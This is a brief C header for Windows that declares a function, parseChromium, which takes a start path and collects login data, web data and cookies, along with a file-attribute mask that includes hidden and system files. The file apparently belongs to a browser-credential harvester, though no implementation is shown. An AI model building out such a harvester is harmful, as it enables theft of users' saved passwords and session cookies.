#pragma once
#include <windows.h>
#include <shlwapi.h>
#include "Parsers.h"
#include "Vector.h"
#define FILE_ATTRIBUTES (FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM)

void parseChromium(PCWCHAR startPath, vector* logindata, vector* webdata, vector* cookies);